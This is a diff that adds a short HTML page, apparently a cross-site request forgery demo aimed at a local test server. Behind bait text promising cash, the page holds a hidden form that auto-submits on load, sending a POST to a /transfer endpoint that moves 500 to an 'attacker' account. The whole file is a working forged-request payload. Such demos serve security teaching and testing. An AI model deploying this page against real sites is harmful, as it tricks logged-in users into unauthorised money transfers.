@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CSRF POST Demo</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <h1>Special Offer – Claim Your Cash!</h1>
+  <p>Enter your details to receive a bonus.</p>
+
+  <form id="attack-form" method="POST" action="http://localhost:3000/transfer">
+    <input type="hidden" name="to" value="attacker">
+    <input type="hidden" name="amount" value="500">
+    <!-- No CSRF token -->
+  </form>
+
+  <script>
+    // Auto‑submit the forged POST request on page load
+    document.getElementById('attack-form').submit();
+  </script>
+</body>
+</html>
+
